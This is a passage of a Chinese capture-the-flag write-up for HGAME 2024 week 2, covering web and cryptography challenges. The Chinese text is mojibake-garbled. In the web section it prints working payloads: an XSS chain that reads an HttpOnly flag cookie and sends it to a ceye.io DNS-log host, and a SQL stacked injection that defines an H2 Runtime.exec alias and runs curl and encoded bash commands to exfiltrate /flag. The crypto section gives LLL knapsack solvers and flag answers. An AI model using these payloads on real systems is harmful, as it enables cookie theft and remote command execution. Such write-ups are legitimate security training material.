class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;bot will visit it.&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> c.RemoteIP() != <span class="string">&quot;127.0.0.1&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;you are not localhost&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">flag, err := os.ReadFile(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;read flag error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.SetCookie(<span class="string">&quot;flag&quot;</span>, <span class="type">string</span>(flag), <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">c.Status(<span class="number">200</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> defaultTmpl = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;YOU ARE&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;æ¬¢è¿æ¥è‡ª &#123;&#123;.RemoteIP&#125;&#125; çš„æœ‹å‹&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;ä½ çš„ User-Agent æ˜¯ &#123;&#123;.GetHeader &quot;User-Agent&quot;&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;flagåœ¨botæ‰‹ä¸Šï¼Œæƒ³åŠæ³•å·è¿‡æ¥&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨<code>/</code> è·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯goçš„sstiå’Œå…¶ä»–è¯­è¨€çš„ä¸å¤ªä¸€æ ·ï¼Œå¹¶ä¸èƒ½ç›´æ¥rceå’Œè¯»æ–‡ä»¶ï¼Œä½†å¯ä»¥xssã€‚</p><p>å…ˆæ˜¯sstiï¼Œ<code>tmpl</code>æœ‰é•¿åº¦å’Œçš„<code>html.EscapeString</code>é™åˆ¶ï¼Œä½†åå¼•å·å¹¶ä¸ä¼šè¢« <code>html.EscapeString</code> è½¬ä¹‰ï¼Œå› æ­¤ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·ã€‚</p><p>è°ƒç”¨ <code>Query</code> å‡½æ•°ï¼ŒæŠŠgetä¼ è¿›å»çš„å˜é‡å½“æˆå­—ç¬¦ä¸²è¾“å‡ºå‡ºæ¥ï¼Œæ­¤æ—¶çš„è¾“å‡ºæ˜¯åŸæ ·è¾“å‡ºï¼Œå¯ä»¥xssã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmpl=&#123;&#123;.Query `user`&#125;&#125;&amp;user=123</span><br></pre></td></tr></table></figure><p><code>user</code>é‡Œå¡«ä¸Šæˆ‘ä»¬çš„jsä»£ç ï¼Œå®ç°äº†xssã€‚</p><p>æ¥ç€æ˜¯xssï¼Œç”±æºç å¯ä»¥çŸ¥é“ï¼Œcookieç”±<code>/flag</code>è·¯ç”±è®¾ç½®ï¼Œå› æ­¤åœ¨ x ä¹‹å‰è¦å…ˆè®¿é—®<code>/flag</code>è®¾ç½®å¥½cookieæ‰èƒ½æŠŠcookieå¸¦å‡ºæ¥ã€‚</p><p>ç„¶åæ˜¯è®¾ç½®cookieçš„æ—¶å€™</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.SetCookie(<span class="string">&quot;flag&quot;</span>, <span class="type">string</span>(flag), <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®¾ç½®çš„å‚æ•°ä½¿å¾—æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç”¨<code>document.cookie</code>æ¥è·å–cookieï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ«çš„æ–¹æ³•æ¥è·å–ã€‚</p><p>ç”¨<code>Cookie</code>å‡½æ•°æ¥è·å–cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmpl=&#123;&#123;.Cookie `flag`&#125;&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®åä¼šæŠŠflagè¾“å‡ºåˆ°å‰ç«¯é¡µé¢ã€‚</p><p>ä¹‹åè¯»å–å‰ç«¯é¡µé¢å†…å®¹ï¼ŒæŠŠå†…å®¹é‡Œçš„ä¸œè¥¿å¸¦å‡ºæ¥å³å¯ã€‚</p><p>xssçš„jsä»£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://127.0.0.1:8080/flag&quot;</span>);<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/?tmpl=&#123;&#123;.Cookie `flag`&#125;&#125;&#x27;</span>);xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;xhr.<span class="title function_">send</span>();xhr.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> a=<span class="string">&quot;y&quot;</span>+(xhr.<span class="property">responseText</span>).<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">4</span>);<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://&quot;</span>+a+<span class="string">&quot;.kbqsag.ceye.io&quot;</span>);&#125;;&#125;,<span class="number">1000</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…ˆæ˜¯è®¿é—®<code>http://127.0.0.1:8080/flag</code>ï¼Œ1såå†è®¿é—®<code>http://127.0.0.1:8080/</code>ç”¨ <code>.Cookie</code> æŠŠflagè¯»å‡ºæ¥ã€‚ï¼ˆå‘1ï¼šè¿™é‡Œåƒäº†å¤§äºï¼Œä¸ç­‰å¾…çš„è¯å¯èƒ½ä¼šæ²¡æœ‰cookieï¼Œå¾—ç¨å¾®ç­‰å¾…ä¸€ä¼šï¼‰</p><p>ä¹‹åè¯»å‡ºè®¿é—®<code>http://127.0.0.1:8080/</code>åçš„é¡µé¢å†…å®¹ï¼Œç„¶åæŠŠå†…å®¹ç”¨dnså¸¦å‡ºæ¥ã€‚ï¼ˆå‘2ï¼šurlé‡Œæœ‰å¤§æ‹¬å·ä¼šå¸¦ä¸å‡ºæ•°æ®ï¼Œå› æ­¤åœ¨å¸¦å‡ºæ¥ä¹‹å‰è¦å¤„ç†ä¸€ä¸‹æ•°æ®ï¼Œä¸èƒ½æœ‰å¤§æ‹¬å·ã€‚ï¼‰</p><p>ä¹‹åå°±åˆ©ç”¨<code>/bot</code>è·¯ç”±å»xssã€‚ï¼ˆå‘3ï¼šæ³¨æ„ä¸€ä¸‹urlç¼–ç ï¼Œ<code>+</code>å’Œ<code>;</code>è¦ç¼–ç ä¸¤æ¬¡ï¼Œå‘é€ç»™<code>/bot</code>è·¯ç”±çš„æ•°æ®æœ‰ä¸€æ¬¡urlè§£ç ï¼Œ<code>/bot</code>å‘é€ç»™è·¯ç”±çš„æ•°æ®ä¹Ÿæœ‰ä¸€æ¬¡urlè§£ç ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå› ä¸º <code>+</code> å’Œ <code>;</code> ä¸¢å¤±å‡ºç° x ä¸åˆ°çš„æƒ…å†µï¼‰</p><p>å…ˆè¯»flagçš„é•¿åº¦ï¼Œä¸ºåè¾¹çš„æˆªå–åšå‡†å¤‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url = http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).length%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°flagçš„é•¿åº¦ä¸º<code>48</code>ã€‚</p><p><img src="/./hgame2024_week2/w_3_1.png"></p><p>flagçš„å¤´æ˜¯<code>hgame</code>æˆ–è€…<code>flag</code>ï¼Œé‚£å…ˆè¯»<code>0~4</code>ä½éªŒè¯ä¸€ä¸‹flagå¤´ï¼Œè¯»å‡ºæ¥çš„æ˜¯<code>hgam</code>ï¼Œè¯´æ˜flagå¤´æ˜¯<code>hgame</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url= http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).substring(0%2C4)%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_3_2.png"></p><p>æ¥ç€è¯» <code>6~46</code>ä½ï¼Œå³æŠŠflagå¤§æ‹¬å·å†…çš„å†…å®¹è¯»å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url= http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).substring(6%2C46)%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_3_3.png"></p><p>æœ€ååŒ…ä¸Šå¤§æ‹¬å·å’Œflagå¤´å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;4ce7fdcfe812901f4460c4d9b9c0e90d77e6d6e6&#125;</span><br></pre></td></tr></table></figure><h2 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h2><p>å †å æ³¨å…¥+HikariCPæ•°æ®åº“rce</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/shineman-zhang/articles/16753095.html">Spring Boot Actuator hikarié…ç½®ä¸å½“å¯¼è‡´çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ </a></p><p>å’Œå‚è€ƒé“¾æ¥çš„åŸç†æ˜¯ä¸€æ ·çš„</p><p>æŸ¥çœ‹ä»£ç çš„sqlè¯­å¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + keyword + <span class="string">&quot;%&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ç”¨äº†æ‹¼æ¥çš„å½¢å¼ï¼Œè¾“å…¥ä¹Ÿæ²¡æœ‰è¿‡æ»¤ï¼Œå› æ­¤å­˜åœ¨sqlæ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡<code>%25&#39;;--+&#39;</code>é—­åˆã€‚</p><p>é—­åˆåï¼Œå¯ä»¥å †å æ³¨å…¥ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥æ‰§è¡Œå‚è€ƒé“¾æ¥é‡Œ RCEæ‰€éœ€çš„SQLè¯­å¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;</span>; <span class="keyword">CALL</span> <span class="keyword">EXEC</span>(<span class="string">&#x27;curl kbqsag.ceye.io&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨ dnslog å¾—åˆ°å›æ˜¾ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ç”¨CREATE ALIASåˆ›å»ºä¸€ä¸ªjavaå‡½æ•°ï¼Œåªéœ€è¦åˆ›å»ºä¸€æ¬¡ï¼Œåç»­æ— éœ€åˆ›å»ºã€‚</p><p>ä¹Ÿå°±æ˜¯åªæœ‰ç¬¬ä¸€æ¬¡çš„æ—¶å€™è¦å‘ï¼Œåé¢åªéœ€è¦æ‰§è¡Œ<code>CALL EXEC(&#39;xxx&#39;);</code>ï¼Œé‡å¤å‘ä¼šå‡ºé”™ã€‚</p><p>è¿™é‡Œè¿˜æ˜¯ç”¨äº†<code>Runtime.getRuntime().exec</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤ç”¨ä¸Šåå¼¹shellçš„payloadï¼Œä¿®æ”¹ä¸€ä¸‹å³å¯ç”¨dnslogå¸¦å‡ºflagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keyword=web%25&#x27;;CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;; CALL EXEC(&#x27;bash -c &#123;echo,Y3VybCBgY2F0IC9mbGFnYC5rYnFzYWcuY2V5ZS5pbw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;);--+</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_4_1.png"></p><p>è¡¥ä¸ŠèŠ±æ‹¬å·å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;99b9cb6e567edccda0a8a4347781af41bb3701f3&#125;</span><br></pre></td></tr></table></figure><h2 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h2><p>å…ˆå¼±å£ä»¤çˆ†ç ´å¯†ç ï¼Œå¾—åˆ°å¯†ç ä¸º <code>qwert123</code></p><p><img src="/./hgame2024_week2/w_5_1.png"></p><p>å’Œweek1çš„<code>Select Courses</code>ä¸€æ ·çš„æ–¹æ³•ï¼Œåœ¨<code>/api/expand</code>é‡å¤å‘åŒ…ã€‚</p><p><img src="/./hgame2024_week2/w_5_2.png"></p><p>ä¹‹åå» <code>è‡ªä¸»é€‰è¯¾</code>é¡µé¢é€‰è¯¾ï¼Œé€‰è¯¾æˆåŠŸåç‚¹<code>é€‰å®Œäº†</code>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week2/w_5_3.png"></p><p><img src="/./hgame2024_week2/w_5_4.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">a=[getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">p=random.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:])==<span class="number">32</span></span><br><span class="line">bag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    temp=p%<span class="number">2</span></span><br><span class="line">    bag+=temp*i</span><br><span class="line">    p=p&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">enc=bytes_to_long(flag)^p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;bag=<span class="subst">&#123;bag&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">enc=871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span></span><br><span class="line"><span class="string">a=[3245882327, 3130355629, 2432460301, 3249504299, 3762436129, 3056281051, 3484499099, 2830291609, 3349739489, 2847095593, 3532332619, 2406839203, 4056647633, 3204059951, 3795219419, 3240880339, 2668368499, 4227862747, 2939444527, 3375243559]</span></span><br><span class="line"><span class="string">bag=45893025064</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>éé¢„æœŸï¼Œ<code>enc</code>æ¥ä¸ª<code>long_to_bytes</code>å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span></span><br><span class="line">flag = long_to_bytes(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="backpack-revenge"><a href="#backpack-revenge" class="headerlink" title="backpack revenge"></a>backpack revenge</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a=[getPrime(<span class="number">96</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">p=random.getrandbits(<span class="number">48</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:])==<span class="number">48</span></span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+hashlib.sha256(<span class="built_in">str</span>(p).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">bag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    temp=p%<span class="number">2</span></span><br><span class="line">    bag+=temp*i</span><br><span class="line">    p=p&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;bag=<span class="subst">&#123;bag&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a=[74763079510261699126345525979, 51725049470068950810478487507, 47190309269514609005045330671, 64955989640650139818348214927, 68559937238623623619114065917, 72311339170112185401496867001, 70817336064254781640273354039, 70538108826539785774361605309, 43782530942481865621293381023, 58234328186578036291057066237, 68808271265478858570126916949, 61660200470938153836045483887, 63270726981851544620359231307, 42904776486697691669639929229, 41545637201787531637427603339, 74012839055649891397172870891, 56943794795641260674953676827, 51737391902187759188078687453, 49264368999561659986182883907, 60044221237387104054597861973, 63847046350260520761043687817, 62128146699582180779013983561, 65109313423212852647930299981, 66825635869831731092684039351, 67763265147791272083780752327, 61167844083999179669702601647, 55116015927868756859007961943, 52344488518055672082280377551, 52375877891942312320031803919, 69659035941564119291640404791, 52563282085178646767814382889, 56810627312286420494109192029, 49755877799006889063882566549, 43858901672451756754474845193, 67923743615154983291145624523, 51689455514728547423995162637, 67480131151707155672527583321, 59396212248330580072184648071, 63410528875220489799475249207, 48011409288550880229280578149, 62561969260391132956818285937, 44826158664283779410330615971, 70446218759976239947751162051, 56509847379836600033501942537, 50154287971179831355068443153, 49060507116095861174971467149, 54236848294299624632160521071, 64186626428974976108467196869]</span></span><br><span class="line"><span class="string">bag=1202548196826013899006527314947</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>èƒŒåŒ…å¯†ç ï¼Œç”¨sageæ¥æ±‚å‡ºpã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">c=<span class="number">1202548196826013899006527314947</span></span><br><span class="line"></span><br><span class="line">pubkey=[<span class="number">74763079510261699126345525979</span>, <span class="number">51725049470068950810478487507</span>, <span class="number">47190309269514609005045330671</span>, <span class="number">64955989640650139818348214927</span>, <span class="number">68559937238623623619114065917</span>, <span class="number">72311339170112185401496867001</span>, <span class="number">70817336064254781640273354039</span>, <span class="number">70538108826539785774361605309</span>, <span class="number">43782530942481865621293381023</span>, <span class="number">58234328186578036291057066237</span>, <span class="number">68808271265478858570126916949</span>, <span class="number">61660200470938153836045483887</span>, <span class="number">63270726981851544620359231307</span>, <span class="number">42904776486697691669639929229</span>, <span class="number">41545637201787531637427603339</span>, <span class="number">74012839055649891397172870891</span>, <span class="number">56943794795641260674953676827</span>, <span class="number">51737391902187759188078687453</span>, <span class="number">49264368999561659986182883907</span>, <span class="number">60044221237387104054597861973</span>, <span class="number">63847046350260520761043687817</span>, <span class="number">62128146699582180779013983561</span>, <span class="number">65109313423212852647930299981</span>, <span class="number">66825635869831731092684039351</span>, <span class="number">67763265147791272083780752327</span>, <span class="number">61167844083999179669702601647</span>, <span class="number">55116015927868756859007961943</span>, <span class="number">52344488518055672082280377551</span>, <span class="number">52375877891942312320031803919</span>, <span class="number">69659035941564119291640404791</span>, <span class="number">52563282085178646767814382889</span>, <span class="number">56810627312286420494109192029</span>, <span class="number">49755877799006889063882566549</span>, <span class="number">43858901672451756754474845193</span>, <span class="number">67923743615154983291145624523</span>, <span class="number">51689455514728547423995162637</span>, <span class="number">67480131151707155672527583321</span>, <span class="number">59396212248330580072184648071</span>, <span class="number">63410528875220489799475249207</span>, <span class="number">48011409288550880229280578149</span>, <span class="number">62561969260391132956818285937</span>, <span class="number">44826158664283779410330615971</span>, <span class="number">70446218759976239947751162051</span>, <span class="number">56509847379836600033501942537</span>, <span class="number">50154287971179831355068443153</span>, <span class="number">49060507116095861174971467149</span>, <span class="number">54236848294299624632160521071</span>, <span class="number">64186626428974976108467196869</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(pubkey))</span></span><br><span class="line"><span class="comment">#272</span></span><br><span class="line">nbit=<span class="number">48</span></span><br><span class="line"><span class="comment">#éšæœºæ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„N</span></span><br><span class="line">N=nextprime(gmpy2.iroot(nbit,<span class="number">2</span>)[<span class="number">0</span>]//<span class="number">2</span>)</span><br><span class="line">L=Matrix(QQ,nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#æ„é€ çŸ©é˜µL</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,nbit]=pubkey[i]*N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[nbit,i]=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L[nbit,nbit]=c*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL start&quot;</span>)</span><br><span class="line">res=L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>)):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]<span class="comment">#æœ€åé¢å¯†æ–‡æ¢å¤åå˜æˆ0</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">1</span>/<span class="number">2</span> <span class="keyword">and</span> m != -<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#æ ¹æ®ç ´è§£åŸç†ï¼Œæ¢å¤çš„æ˜æ–‡åº”åªåŒ…å«-1/2å’Œ1/2</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        mm=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (i, M)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">            <span class="keyword">if</span> j==-<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#ä¸ç¡®å®š-1/2å’Œ1/2å“ªä¸ªä»£è¡¨äºŒè¿›åˆ¶1</span></span><br><span class="line">                mm+=<span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm+=<span class="string">&quot;0&quot;</span></span><br><span class="line">flag=mm[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p = <span class="built_in">int</span>(flag,<span class="number">2</span>)</span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+hashlib.sha256(<span class="built_in">str</span>(p).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># hgame&#123;04b1d0b0fb805a70cda94348ec5a33f900d4fd5e9c45e765161c434fa0a49991&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="midRSA"><a href="#midRSA" class="headerlink" title="midRSA"></a>midRSA</h2><p>éé¢„æœŸ</p><p>æºç 